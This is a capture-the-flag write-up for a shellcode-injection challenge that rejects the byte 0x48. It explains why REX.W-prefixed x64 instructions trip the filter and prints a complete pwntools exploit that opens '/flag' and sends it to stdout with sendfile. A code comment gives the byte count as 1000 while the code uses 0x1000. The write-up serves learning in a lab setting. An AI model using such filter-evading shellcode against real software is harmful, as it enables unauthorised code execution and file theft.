Challenge Description
Challenge: /challenge/ello-ackers

Category: Shellcode Injection

Goal: Write shellcode to read the flag.
Constraint: The challenge reads bytes from stdin and executes them, but with a strict filter: No 'H' bytes (0x48) allowed.

Phase 1: The Naive Approach (Failure)
My initial thought was to use standard x64 shellcode to perform an open -> read -> write (ORW) chain. I attempted to construct the registers directly using 64-bit operations.

The Failed Script
Python
from pwn import *
context.arch = 'amd64'

assembly = """
    /* 1. Construct string "/flag" */
    mov rax, 0x67616c662f       /* "/flag" in hex */
    push rax
    mov rdi, rsp                /* rdi points to "/flag" */

    /* 2. open("/flag", O_RDONLY) */
    xor rsi, rsi                /* O_RDONLY = 0 */
    mov rax, 2                  /* SYS_open */
    syscall

    /* ... rest of the ORW chain ... */

payload = asm(assembly)
p = process('/challenge/ello-ackers')
p.send(payload)
p.interactive()

The Error
The challenge immediately rejected the shellcode:
Plaintext
Executing filter...
This challenge requires that your shellcode have no H bytes!
Failed filter at byte 0!
Analysis
Why 'H'? In ASCII, the character 'H' corresponds to hex value 0x48.
In x86-64 assembly, 0x48 is the REX.W prefix. It is automatically added by the assembler whenever we operate on 64-bit registers (like rax, rbx, rdi, rsi).

Looking at the disassembly of my failed attempt:

Code snippet
0:  48 b8 2f 66 6c 61 ...   mov rax, 0x67616c662f  <-- The '48' here is the 'H' byte!
Conclusion: I cannot use any instruction that requires the REX.W prefix. This means:

No mov rax, ...

No mov rdi, rsp

No xor rsi, rsi (if it encodes to 64-bit operand)

Phase 2: Debugging & Optimization
I needed to rewrite the assembly to perform the same logic using only instructions that don't generate 0x48.

Strategy
32-bit Registers: Use eax, ebx, esi instead of rax, rbx, rsi. Writing to a 32-bit register automatically clears the upper 32 bits of the 64-bit register.

mov rax, 2 (Bad: 48 c7 c0...) -> push 2; pop rax (Good: 6a 02 58).

xor rsi, rsi (Bad) -> xor esi, esi (Good).

Stack Manipulation: Use push and pop to move data between registers, as these are single-byte instructions (usually).

mov rdi, rsp (Bad: 48 89 e7) -> push rsp; pop rdi (Good: 54 5f).

Memory Access: Use mov dword ptr or mov byte ptr to build strings byte-by-byte instead of loading huge 64-bit immediates.

Intermediate "Bad Char" Hunt
Even after fixing some instructions, I still hit the filter. I used disasm(payload) to find the remaining culprits.

Culprit 1: shl rbx, 0x8 -> Generated 48 c1....

Fix: Don't use shift on 64-bit regs. Use explicit memory writes.

Culprit 2: mov rdi, rsp -> Generated 48 89 e7.

Fix: push rsp followed by pop rdi.

Phase 3: The Final Solution
Here is the final working exploit script. It uses sendfile instead of read/write for brevity and efficiency.

Python
#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

assembly = """
    /* === 1. Construct path "/flag" on stack === */
    
    /* Clear RSI (Flags = 0). 'xor esi, esi' avoids 0x48 prefix */
    xor esi, esi            
    
    /* Push null terminators/padding onto stack */
    push rsi
    push rsi
    
    /* Build string "/flag" manually to avoid 64-bit immediates */
    /* Stack grows down. We write "flag" at rsp+1, "/" at rsp */
    mov dword ptr [rsp+1], 0x67616c66  /* "flag" */
    mov byte ptr [rsp], 0x2f           /* "/" */
    
    /* === 2. open("/flag", O_RDONLY) === */
    
    /* set rdi = rsp (pointer to string) */
    /* 'mov rdi, rsp' contains 0x48. Use push/pop instead */
    push rsp
    pop rdi
    
    /* rsi is already 0 (O_RDONLY) from earlier */
    
    /* rax = 2 (SYS_open) */
    push 2
    pop rax
    syscall
    
    /* === 3. sendfile(1, fd, 0, 1000) === */
    /* sendfile(out_fd, in_fd, offset, count) */
    
    /* rsi = in_fd (the fd returned by open in rax) */
    /* 'mov esi, eax' clears high bits and avoids 0x48 */
    mov esi, eax
    
    /* rdi = 1 (stdout) */
    push 1
    pop rdi
    
    /* rdx = 0 (offset). 'cdq' uses eax's sign bit to zero edx */
    cdq
    
    /* r10 = 1000 (count). 'mov r10d' uses 0x41 prefix (Safe) */
    mov r10d, 0x1000
    
    /* rax = 40 (SYS_sendfile) */
    push 40
    pop rax
    syscall
    
    /* === 4. Exit cleanly === */
    mov al, 60
    syscall

payload = asm(assembly)

if b'\x48' in payload:
    print("[-] Failed: Payload still contains 0x48!")
    print(disasm(payload))
else:
    print("[+] Success: Payload is clean. Sending...")
    p = process('/challenge/ello-ackers')
    p.send(payload)
    p.interactive()
Shellcode Logic Breakdown
String Construction:
Instead of mov rax, 0x..., I pushed 0s to the stack to serve as the null terminator and then used mov dword ptr and mov byte ptr to write flag and / respectively. This allows granular control without triggering 64-bit operand prefixes.

Stack Layout:

Plaintext
RSP      ->  '/' (0x2f)
RSP + 1  ->  'f' (0x66)
RSP + 2  ->  'l' (0x6c)
RSP + 3  ->  'a' (0x61)
RSP + 4  ->  'g' (0x67)
RSP + 5  ->  0x00 (Null Terminator)
Pointer Loading (push rsp; pop rdi):
This is a classic shellcoding trick. mov rdi, rsp is 3 bytes (48 89 e7). push rsp (1 byte 54) + pop rdi (1 byte 5f) achieves the same result in 2 bytes and avoids the forbidden 0x48.

The sendfile Syscall:

Syscall ID: 40 (0x28).

Args: out_fd (1), in_fd (from open), offset (0), count (size).

I used cdq to zero out rdx. Since eax (file descriptor) is a small positive integer, cdq (Convert Double to Quad) fills rdx with zeros. This is a 1-byte instruction (0x99).
